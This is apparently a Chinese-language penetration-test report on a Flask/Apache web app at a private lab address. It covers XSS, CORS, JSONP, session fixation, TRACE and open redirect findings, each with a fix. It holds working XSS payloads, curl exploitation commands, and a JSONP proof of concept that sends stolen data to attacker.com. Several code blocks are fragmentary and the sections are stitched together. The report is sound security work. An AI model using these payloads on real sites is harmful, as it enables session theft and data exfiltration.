### 二、详细发现

#### 🔴 发现 #1：TRACE方法启用 (XST漏洞) — HIGH

- **路径：** `http://192.168.230.139/`（全局）
- **HTTP方法：** TRACE → 200 OK
- **响应大小：** ~200字节（随请求头变化）
- **Content-Type：** message/http

**描述：** Apache服务器启用了TRACE HTTP方法。TRACE请求会完整回显请求内容（包括Cookie、Authorization等所有请求头），构成跨站追踪（XST）攻击面。

**验证PoC：**
```
$ curl -s -X TRACE -H "X-Test: injection-test" http://192.168.230.139/
TRACE / HTTP/1.1
Host: 192.168.230.139
User-Agent: curl/8.17.0
Accept: */*
X-Test: injection-test
```

**可利用性：** 结合已发现的缺失HttpOnly Cookie标志、缺失CSP头和缺失X-XSS-Protection头，攻击者可通过XSS配合TRACE反射窃取会话Cookie。这是一个完整的攻击链组合。

**修复建议：** Apache配置中添加 `TraceEnable off`

---

#### 🟠 发现 #2：/icons/ 目录列表启用 — MEDIUM

- **路径：** `http://192.168.230.139/icons/`
- **HTTP状态码：** 200 OK
- **响应大小：** 74,416字节
- **Content-Type：** text/html (Apache autoindex)

**描述：** Apache的/icons/目录启用了mod_autoindex目录列表功能，暴露了388个图标文件（GIF、PNG、SVG）和一个README文件。内容为标准Apache分发图标（公共领域），但目录列表本身构成信息泄露，暴露了Apache版本和部署结构。

**关联发现：** `/icons/README` — 5,108字节，text/plain

**修复建议：** Apache配置中添加 `Options -Indexes` 或移除mod_autoindex模块

---

#### 🟠 发现 #3：/cgi-bin/ 目录暴露（403禁止访问）— MEDIUM

- **路径：** `http://192.168.230.139/cgi-bin/`
- **HTTP状态码：** 403 Forbidden
- **响应大小：** 199字节
- **Content-Type：** text/html; charset=iso-8859-1（Apache原生响应）

**描述：** /cgi-bin/目录物理存在但返回403。关键指纹特征：403响应来自Apache直接处理（charset=iso-8859-1，199字节），而非Flask WSGI应用（utf-8，207字节）。这确认了/cgi-bin/是Apache独立管理的目录树，不受Flask路由保护。

**绕过尝试（均失败）：**
- POST、PUT、PATCH方法：403
- X-HTTP-Method-Override头：403
- 路径遍历（. 和 %2e）：403
- CGI脚本探测（test-cgi、printenv等）：404（196字节Apache响应）

**可利用性：** 当前利用价值低。但若后续测试发现文件上传漏洞或路径遍历漏洞，向该目录写入恶意CGI脚本可导致远程代码执行（RCE）。

### OPTIONS预检响应（204 No Content）

### 核心结论

- **null Origin被接受**：来自 sandboxed iframe 或 `file://` 上下文的攻击可读取响应（非凭证模式）

### 修复方案
**Apache配置：**
```apache
# 限制CORS来源为白名单
Header always set Access-Control-Allow-Origin "https://trusted.example.com"
# 拒绝null Origin
SetEnvIf Origin "null" deny_null_origin
Header always set Access-Control-Allow-Origin "null" "expr=%{ENV:deny_null_origin} == 1"
```

**Flask代码级修复：**
```python
ALLOWED_ORIGINS = {'https://trusted.example.com'}

@app.after_request
def cors_headers(response):
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
    # 不在白名单的Origin不设置ACAO，浏览器将拒绝响应
    return response
```

### JSONP端点分析

### JSONP响应内容
```http

X-JSONP-Callback: testFunc

testFunc({"message":"Hello, JSONP!","timestamp":1781973179,
"items":["foo","bar","baz"],"source":"http://192.168.230.139"})
```

### 数据外泄机制验证

JSONP端点返回 `Content-Type: application/javascript`，浏览器将其作为脚本执行。结合通配符CORS（ACAO:*），攻击者可构造恶意页面：

```html
<!-- PoC: JSONP + CORS Data Exfiltration -->
<script>
function stealData(data) {
    // 通过Image信标外泄数据
    new Image().src = 'https://attacker.com/collect?data=' 
        + encodeURIComponent(JSON.stringify(data));
}
</script>
<script src="http://192.168.230.139/api/jsonp?callback=stealData"></script>
```

**当前限制：** JSONP端点返回静态测试数据而非敏感数据，实际危害有限。
**风险等级：MEDIUM** — 机制完全可用，若未来端点返回用户数据则升级为HIGH。

### 修复方案
**Flask代码级修复：**
```python
import re

VALID_CALLBACK = re.compile(r'^[a-zA-Z_$][a-zA-Z0-9_.]*$')

@app.route('/api/jsonp')
def jsonp():
    callback = request.args.get('callback', 'callback')
    if not VALID_CALLBACK.match(callback):
        abort(400, 'Invalid callback name')
    # 限制回调名长度为防止滥用
    if len(callback) > 64:
        abort(400, 'Callback name too long')
    # 设置X-Content-Type-Options防止MIME嗅探
    response = make_response(f'{callback}({json.dumps(data)})')
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response
```

### 关键发现

**会话固定攻击可行：**
```bash
# 攻击者设置受害者将使用的会话Cookie
curl "http://192.168.230.139/api/cookie/set?name=session&value=attacker_controlled&same_site=None"
# 响应: Set-Cookie: session=attacker_controlled; Path=/; SameSite=None
```

**SameSite=None 可被设置** — 允许Cookie在跨站请求中发送，配合CSRF攻击面。

**HttpOnly/Secure/Path/Domain 不可控** — 服务器忽略这些参数，限制了完整Cookie劫持的能力。

**风险等级：MEDIUM** — 会话固定+SameSite=None，但缺少HttpOnly/Secure控制限制完全劫持。

### 修复方案
**Flask代码级修复：**
```python
@app.route('/api/cookie/set')
def cookie_set():
    name = request.args.get('name', 'cookie_name')
    value = request.args.get('value', 'cookie_val')
    
    # 阻止覆盖关键Cookie
    FORBIDDEN_NAMES = {'session', 'auth', 'token', 'csrf'}
    if name.lower() in FORBIDDEN_NAMES:
        abort(403, 'Cannot set reserved cookie name')
    
    # 始终设置安全属性（忽略用户输入）
    response = make_response(jsonify({"status": "cookie set"}))
    response.set_cookie(
        name, value,
        path='/',
        secure=True,          # 强制Secure
        httponly=True,        # 强制HttpOnly
        samesite='Strict',    # 强制Strict
        max_age=request.args.get('max_age', 3600, type=int)
    )
    return response
```

### 攻击链分析

- 非浏览器HTTP客户端（自动化工具、代理、IoT设备）
- 预HTTP/2时代的遗留客户端
- 中间代理可能支持TRACE

```python
    return True
```

### 二、关键发现详情

#### 🔴 CRITICAL-1: /api/custom-headers Content-Type投毒 → 反射型XSS

**根因：** 该端点允许查询参数覆写任意响应头，包括 `Content-Type`。传入 `Content-Type=text/html` 后，JSON响应体被浏览器作为HTML解析，注入在自定义Header值中的XSS Payload被立即执行。

**确认Payload（6种全部成功）：**
- `<svg onload=alert(1)>` — SVG onload即时触发
- `<img src=x onerror=alert(1)>` — 图片加载失败触发
- `<script>alert(1)</script>` — 脚本即时执行
- `<details open ontoggle=alert(1)>` — 折叠展开触发
- `<input autofocus onfocus=alert(1)>` — 自动聚焦触发
- `<marquee onstart=alert(1)>` — 滚动开始触发

**攻击URL示例：**
```

```

**利用场景：** 会话Cookie窃取、localStorage数据外泄、持久化XSS植入（见攻击链）。

---

#### 🔴 CRITICAL-2: escAttr()绕过 → 存储型DOM XSS

**根因：** SPA中的 `escAttr()` 函数（第101行）转义了字面量 `"`、`<`、`>` 字符，但**未转义 `&` → `&amp;`**。攻击者可输入包含 `&quot;` 的数据，该实体穿透 `escAttr()` 后被浏览器解码为 `"`，从而突破HTML属性上下文。

**漏洞代码：**
```javascript
function escAttr(t) {
    return t.split('"').join('&quot;')   // 转义 " → &quot;
            .split('<').join('&lt;')    // 转义 < → &lt;
            .split('>').join('&gt;');   // 转义 > → &gt;
    // BUG: 未转义 & → &amp;，导致 &quot; 穿透！
}
```

**绕过Payload：**
```
http://192.168.230.139/&quot;onmouseover=alert(1)//
```
存储到 `localStorage.shc_history` 后，浏览器渲染为：
```html
<div data-url="http://192.168.230.139/"onmouseover=alert(1)//">
```
`&quot;` 被解码为 `"` → 闭合属性 → `onmouseover` 成为新事件处理器。

**影响范围：** `escAttr()` 被调用**17次**，覆盖历史记录渲染、API端点列表、复制按钮等所有用户可控数据渲染点。XSS在用户鼠标悬停历史记录芯片时触发。

### 二、各分类详细发现

#### 2.1 命令注入 — NOT VULNERABLE

所有注入字符（`;`、`|`、`$(...)`、`` `...` ``、`%0a`、`||`、`&&`）在 `/api/echo` 端点均被原样反射至JSON响应中，未被shell解释。根因：Flask使用 `flask.jsonify()` 安全序列化数据，无系统命令调用路径。`/api/status/<int:code>` 和 `/api/delay/<int:seconds>` 使用Flask严格路由类型校验，非整数输入直接返回404。

#### 2.2 路径穿越 — NOT VULNERABLE

对 `/api/content-type/<type>` 的15种路径穿越Payload全部被阻止：裸路径（`../../../etc/passwd`）→404、URL编码（`..%2f..%2f`）→404、双重编码（`..%252f..%252f`）→400、Unicode变形（`..%c0%af`）→400、空字节注入→404。`file://` 协议被 `/api/check` 的 `https://` 前缀阻止。根因：端点仅服务预定义内容类型（html/json/xml/text等），Flask路由进行路径规范化。

#### 2.3 文件包含(LFI/RFI) — NOT VULNERABLE

PHP包装器（`php://filter`、`data://`、`expect://`）不适用于Python/Flask后端。Flask运行在 production 模式（debug=False），Werkzeug调试控制台 `/console` 不可达（404）。无法触发错误页面泄露源码。

#### 2.4 文件上传安全 — NOT EXPLOITABLE

**关键发现：** POST `/api/upload` 端点明确声明文件**"仅读取，未保存到磁盘"**。所有上传文件在内存中处理后被丢弃，不调用 `file.save()`。因此：
- PHP/Python/WSGI恶意文件上传 → 接受但不保存
- GIF魔术字节伪装 → 无影响
- 双扩展名（shell.php.jpg）→ 无影响
- 路径穿越文件名（`../../../etc/cron.d/evil`）→ 无影响
- 大小限制严格执行（1MB），超限返回 400 错误

#### 2.5 SQL注入探测 — NOT VULNERABLE

所有端点（/api/echo、/api/check、/api/status、/api/jsonp）的SQL注入Payload（`' OR '1'='1`、`UNION SELECT`、`SLEEP()`）均被安全处理：/api/echo 原样反射为JSON，/api/check 将Payload作为URL主机名处理，严格路由类型校验拒绝特殊字符。无SQL错误消息泄露，无时间延迟差异。根因：应用可能使用SQLAlchemy ORM（参数化查询）或根本不使用数据库。

#### 2.6 SSTI模板注入 — NOT VULNERABLE

18个Jinja2 SSTI检测Payload全部被安全反射，未发生模板求值：

- `{{config}}` → 返回字符串而非Flask配置转储

```python
import socket
from urllib.parse import urlparse

BLOCKED_NETWORKS = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),

    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('0.0.0.0/8'),

    ipaddress.ip_network('240.0.0.0/4'),   # 保留

    if parsed.scheme not in ('http', 'https'):

        if ip in net:

def api_check():

        if resp.is_redirect:
            final = resp.headers.get('Location', '')
            if not is_safe_url(final):

        return jsonify({...})
    except Exception as e:
        return jsonify({"error": str(e)}), 400
```

### V02 — Content-Type投毒导致反射型XSS（CRITICAL | CWE-79 | CVSS 7.4）

**受影响端点：** `GET /api/custom-headers?Content-Type=text/html&X=<payload>`

**漏洞描述：**
`/api/custom-headers` 端点允许通过查询参数动态覆写任意HTTP响应头，包括 `Content-Type`。当攻击者传入 `Content-Type=text/html` 时，原本 `Content-Type: application/json` 的JSON响应体被浏览器作为HTML文档解析，注入在自定义Header值中的XSS Payload被立即执行。

**复现步骤：**

1. 构造以下URL：
```
http://192.168.230.139/api/custom-headers?Content-Type=text/html&X=<svg onload=alert(1)>
```

2. 诱导受害者访问该URL

3. 浏览器将JSON响应体解析为HTML，`<svg onload=alert(1)>` 在自定义响应头值中作为HTML元素被渲染并立即触发XSS

**确认成功的6种Payload：**
- `<svg onload=alert(1)>` — SVG onload即时触发
- `<img src=x onerror=alert(1)>` — 图片加载失败触发
- `<script>alert(1)</script>` — 脚本即时执行
- `<details open ontoggle=alert(1)>` — 折叠展开触发
- `<input autofocus onfocus=alert(1)>` — 自动聚焦触发
- `<marquee onstart=alert(1)>` — 滚动开始触发

**限制：** 含双引号(`"`)的Payload因JSON序列化被转义，无法直接突破。但可结合SVG/IMG事件处理器绕过此限制。

**危害描述：**
- 会话Cookie窃取（`document.cookie`）
- localStorage数据外泄
- 持久化XSS植入（向localStorage写入恶意代码，参见V03）
- 因无CSP保护（V05），脚本执行完全不受限制

**修复建议（Python代码级）：**
```python
ALLOWED_HEADERS = {
    'X-Token', 'X-Request-Id', 'X-Custom-Header',
    'X-RateLimit-Limit', 'X-RateLimit-Remaining', 'X-RateLimit-Reset'
}

FORBIDDEN_RESPONSE_HEADERS = {
    'content-type', 'content-length', 'content-encoding',
    'set-cookie', 'location', 'refresh',
    'access-control-allow-origin', 'access-control-allow-credentials',
    'access-control-allow-methods', 'access-control-allow-headers',
    'x-content-type-options', 'x-frame-options',
    'content-security-policy', 'strict-transport-security',
    'cache-control', 'pragma', 'expires'
}

@app.route('/api/custom-headers')
def custom_headers():
    headers = {}
    for key, value in request.args.items():
        if key.lower() in FORBIDDEN_RESPONSE_HEADERS:
            continue
        if key not in ALLOWED_HEADERS:
            continue
        headers[key] = value
    response = jsonify({"headers": list(headers.keys())})
    for key, value in headers.items():
        response.headers[key] = value
    return response
```

**Apache配置层修复：**
```apache

    Header always set Content-Type "application/json; charset=utf-8"
</Location>
```

### V03 — escAttr()绕过导致存储型DOM XSS（CRITICAL | CWE-79 | CVSS 7.5）

**受影响端点：** `localStorage.shc_history` → SPA主页面 `/`

**漏洞描述：**
SPA应用中的 `escAttr()` 函数（客户端JavaScript）负责对插入HTML属性上下文的数据进行转义。该函数正确转义了 `"` → `&quot;`、`<` → `&lt;`、`>` → `&gt;`，但**未转义 `&` → `&amp;`**。攻击者可通过输入包含 `&quot;` 的数据，该HTML实体穿透 `escAttr()`（因为 `&` 未被转义，浏览器随后将 `&quot;` 解码为 `"`），从而突破HTML属性上下文，注入任意事件处理器。

**漏洞代码（SPA JavaScript 第101行附近）：**
```javascript
function escAttr(t) {
    return t.split('"').join('&quot;')   // 转义 " → &quot;
            .split('<').join('&lt;')    // 转义 < → &lt;
            .split('>').join('&gt;');   // 转义 > → &gt;
    // BUG: 未转义 & → &amp;，导致 &quot; 穿透！
}
```

**复现步骤：**
1. 访问以下URL使恶意数据写入localStorage：
```
http://192.168.230.139/&quot;onmouseover=alert(1)//
```

2. 或通过V02 XSS攻击链写入：
```javascript
localStorage.setItem('shc_history', JSON.stringify([{
    url: "http://x/&quot;onmouseover=alert(1)//",
    timestamp: Date.now()/1000
}]))
```

3. 刷新页面后，`renderHistory()` 渲染历史记录芯片，浏览器处理为：
```html
<div data-url="http://192.168.230.139/"onmouseover=alert(1)//">
```
其中 `&quot;` 被浏览器解码为 `"` → 闭合 `data-url` 属性 → `onmouseover` 成为新事件处理器

4. 用户鼠标悬停历史记录芯片时XSS触发

**影响范围：** `escAttr()` 函数在SPA中被调用17次，覆盖历史记录渲染、API端点列表、复制按钮等所有用户可控数据渲染点。

**危害描述：**
- 持久化跨页面XSS（localStorage数据跨页面/会话存活）
- 自传播能力（每次页面加载可从localStorage重新植入）
- 全同源权限访问（读写localStorage、发起认证API调用、读取DOM）

**修复建议（JavaScript代码级）：**
```javascript
// 修复方案1：在所有替换之前先转义 &
function escAttr(t) {
    return t.split('&').join('&amp;')   // 必须先处理 &
            .split('"').join('&quot;')
            .split('<').join('&lt;')
            .split('>').join('&gt;');
}

// 修复方案2（推荐）：使用textContent替代innerHTML渲染
function renderHistory() {
    const container = document.getElementById('history-list');
    container.innerHTML = '';
    const data = JSON.parse(localStorage.getItem('shc_history') || '[]');
    data.forEach(entry => {
        const div = document.createElement('div');
        const span = document.createElement('span');
        span.textContent = entry.url;  // 安全：不会解析HTML
        div.appendChild(span);
        container.appendChild(div);
    });
}

// 修复方案3：使用DOMPurify库
// <script src="https://cdn.jsdelivr.net/npm/dompurify@3/dist/purify.min.js"></script>
function renderHistory() {
    const raw = buildHistoryHTML(data);
    container.innerHTML = DOMPurify.sanitize(raw);
}
```

### V04 — CORS通配符(ACAO:*) + null Origin接受（HIGH | CWE-942 | CVSS 7.5）

**受影响范围：** 全局响应头

**漏洞描述：**
应用在所有响应中返回 `Access-Control-Allow-Origin: *`，允许任意域通过跨域请求读取响应内容。同时，当请求包含 `Origin: null` 时，服务器回显 `Access-Control-Allow-Origin: null`，允许sandboxed iframe等环境读取响应。

**关键测试结果：**
- 无Origin请求 → ACAO回显`*`
- 带Origin（evil.example.com）+ 无Cookie → ACAO回显`evil.example.com`，允许非凭证读取
- 带Origin + Cookie → ACAO回显但ACAC未设置，浏览器阻止凭证跨域读取
- null Origin → ACAO回显`null`，sandboxed iframe可读取
- OPTIONS预检 → ACAM: GET/POST/PUT/DELETE/PATCH/OPTIONS，ACAH包含Authorization

**危害描述：**
- 任意恶意网站可通过fetch读取API响应内容
- 结合JSONP端点（V10）可实现数据外泄
- 虽凭证跨域读取被浏览器阻止，但非凭证敏感数据可被外泄
- null Origin允许sandboxed环境绕过同源策略

**修复建议（Python/Flask代码级）：**
```python
ALLOWED_ORIGINS = {'https://trusted.example.com'}

@app.after_request
def cors_headers(response):
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
        response.headers['Access-Control-Max-Age'] = '3600'
    elif origin is not None:
        # 拒绝非白名单Origin
        pass
    return response
```

**Apache配置修复：**
```apache
Header always set Access-Control-Allow-Origin "https://trusted.example.com"
```

**修复建议（Flask代码级）：**

```python
import re

VALID_CALLBACK = re.compile(r'^[a-zA-Z_$][a-zA-Z0-9_.]*$')

@app.route('/api/jsonp')
def jsonp():
    callback = request.args.get('callback', 'callback')
    if not VALID_CALLBACK.match(callback) or len(callback) > 64:
        abort(400, 'Invalid callback name')
    response = make_response(f'{callback}({json.dumps(data)})')
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response
```

### V13 — 开放重定向(javascript:/data: URI)（MEDIUM | CWE-601 | CVSS 4.3）

**受影响端点：** `GET /api/redirect?to=`

**漏洞描述：**
`/api/redirect?to=` 端点对重定向目标URL验证不完整：正常HTTP重定向验证较严格（`@`绕过、协议相对URL、反斜杠变形均被拒绝），但允许 `javascript:` 和 `data:` URI协议。

```bash
# javascript: URI（旧浏览器中可触发XSS）
curl -s -o /dev/null -w "Location: %{redirect_url}" \
  "http://192.168.230.139/api/redirect?to=javascript:alert(1)"
→ Location: javascript:alert(1)

# data: URI
curl -s -o /dev/null -w "Location: %{redirect_url}" \
  "http://192.168.230.139/api/redirect?to=data:text/html,<script>alert(1)</script>"
→ Location: data:text/html,<script>alert(1)</script>
```

**利用价值：** 现代浏览器对 `javascript:` 重定向防护较好，但在部分旧浏览器或特定上下文中仍可利用。

**修复建议（Flask代码级）：**
```python
import re
from flask import redirect, abort

ALLOWED_REDIRECTS = {'/api/echo', '/', '/api/cors', '/api/cookie/get'}
SAFE_SCHEMES = {'http', 'https'}

@app.route('/api/redirect')
def api_redirect():
    to = request.args.get('to', '/api/echo')
    
    # 禁止危险协议
    parsed = urlparse(to)
    if parsed.scheme and parsed.scheme not in SAFE_SCHEMES:
        return redirect('/api/echo')
    
    # 白名单验证
    if to not in ALLOWED_REDIRECTS and not (
        to.startswith('/') and not to.startswith('//')
    ):
        return redirect('/api/echo')
    
    return redirect(to)
```
